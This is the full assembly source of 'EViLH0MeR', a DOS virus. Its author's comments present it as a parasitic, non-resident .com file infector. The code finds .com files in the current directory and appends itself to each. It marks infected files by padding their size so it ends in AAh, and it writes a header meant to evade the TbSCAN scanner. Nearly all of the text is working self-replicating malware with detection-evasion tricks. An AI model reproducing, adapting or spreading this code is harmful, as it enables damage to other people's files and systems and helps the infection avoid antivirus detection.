;[EViLH0MeR] by Sepultura
;
; Compile with A86
;
; This is is a simple, lame, parasitic, non-resident, .com infector.
; It doesnt even restore original date and time stamps, and turn of
; read-only attributes.
;
; The only reason i wrote this virus is to illustrate an idea...
; the idea of marking infected files in their _SIZE_ field..
; I tried explaining it to a few people, but they didnt get WTF
; i was rambling on aobut.. so i just whipped up this thing to
; show them.
;
; Basically all infected file lengths end in AAh (that is the last byte
; of the size field), so one in 256 files will falsely be identified as
; infected. This is like illeagal date and time fields (seconds=62 or 
; years+=100), but it is not doing anything illeagle, and wont set of 
; any flags or suspicions.. It is just a new (i think) way to mark infected
; files, without having to open them (although this virus opens them 1st).
;
; I first got this idea from looking at the Size Padding in Havoc, so thanks
; go to Neurobasher.
;
; South Australia is a Stagnant State..

	radix   16

	org     100

	length  equ     offset end - offset vstart

	db      0d,0a,20                        ;this is the stub file
	db      0e9,0,0

vstart: call    delta2                          ;calculate delta offset
delta1: db      '[EViLH0MeR]',0,'SêpóLÁÅrí',0,  ;Duh?
delta2: pop     bp
	sub     bp,offset delta1
	
	mov     ds,cs                           ;ES=DS=CS
	mov     es,ds

	lea     si,[offset first_6+bp]          ;Restore first 6 bytes
	mov     di,100                          ;back to 100h
	push    di
	cld
	movsw
	movsw
	movsw
	
	lea     di,[offset end+bp]              ;copy orig PSP to end
	xor     si,si                           ;of virus. This is
	pop     cx                              ;for programs that use
	push    cx                              ;command lines.
	rep     movsb

	mov     ah,4e                           ;find first
	lea     dx,[offset searchstring+bp]     ;*.com
	int     21
	jc      no_files

file_found:
	mov     ax,3d02                         ;open it..
	mov     dx,9e
	int     21
	jc      nextloop
	cwd
	xchg    bx,ax
	
	mov     ah,3f                           ;save first 6 bytes
	mov     cx,6
	lea     dx,[offset first_6+bp]
	int     21
	jc      file_exit
	
	mov     ax,4202                         ;go to end of file
	xor     cx,cx
	cwd
	int     21
						;**********************
	cmp     al,0AA                          ;*** Is Length ??AA ***
	jz      file_exit                       ;**********************
						;(if so already infected)
	
	add     ax,length                       ;*** Get length of ***
	jc      file_exit                       ;*** infected file ***
						;exit if over FFFFh
	
						;*************************
	mov     dx,ax                           ;*** Calculate  Length ***
	mov     dl,0AA                          ;***  Ending  in  AAh  ***
	cmp     dx,ax                           ;*************************
	adc     dh,0                            ;take up if nescesary
	jc      file_exit                       ;exit if over FFFFh
	
	xor     cx,cx                           ;****************************
	sub     dx,length                       ;*** Go To The Point That ***
	mov     ax,4200                         ;*** Will Finish At ??AAh ***
	int     21                              ;***   After  Infection   ***
						;****************************
	
	sub     ax,6                            ;calculate jump destination 
	mov     [offset jmp_dest+bp],ax
	
	mov     ah,40                           ;write virus body to end
	mov     cx,length
	lea     dx,[offset vstart+bp]
	int     21
	
	mov     ax,4200                         ;go back to da start
	cwd
	xor     cx,cx
	int     21
	
	mov     ah,40                           ;write anti-tbscan signature
	mov     cx,6                            ;and jump to virus body
	lea     dx,[offset start_jmp+bp]
	int     21

file_exit:
	mov     ah,3e                           ;close
	int     21

nextloop:
	mov     ah,4f                           ;next thank you...
	int     21
	jnc     file_found

no_files:
	lea     si,[offset end+bp]              ;restore saved PSP
	xor     di,di
	pop     cx
	push    cx
	rep     movsb
	ret                                     ;back to 100h

searchstring    db      '*.com', 0

start_jmp       db      0d,0a,20,0e9            ;anti TbSCAN and JMP16
jmp_dest        dw      0                       ;destination of jump
first_6         db      90,90,90,90,0cd,20      ;start of host
end:            
